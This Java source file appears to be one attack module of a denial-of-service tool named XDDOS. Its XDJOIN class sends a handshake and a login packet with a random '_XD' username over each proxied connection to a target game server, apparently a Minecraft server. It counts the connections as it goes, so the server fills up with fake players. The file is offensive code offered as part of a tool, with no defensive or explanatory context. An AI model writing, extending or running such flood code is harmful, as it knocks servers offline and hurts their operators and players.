package XD.XDDOS.methods;

import java.security.SecureRandom;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;


public class XDJOIN
  implements Method
{
  private final Handshake handshake;
  private final byte[] bytes;
  
  
  public XDJOIN() {
    this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(999999999)+"_XD")).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
